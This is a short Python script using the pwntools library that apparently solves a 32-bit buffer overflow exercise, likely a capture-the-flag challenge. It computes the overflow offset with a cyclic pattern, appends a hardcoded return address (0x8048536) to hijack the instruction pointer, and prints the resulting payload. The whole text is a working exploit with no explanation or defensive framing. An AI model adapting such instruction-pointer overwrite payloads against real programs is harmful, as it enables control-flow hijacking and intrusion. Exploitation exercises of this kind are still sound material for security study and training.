from pwn import *
pad = cyclic(100)
pad = cyclic(cyclic_find("jaaa"))
eip = p32(0x8048536)
payload = pad + eip
print(payload)
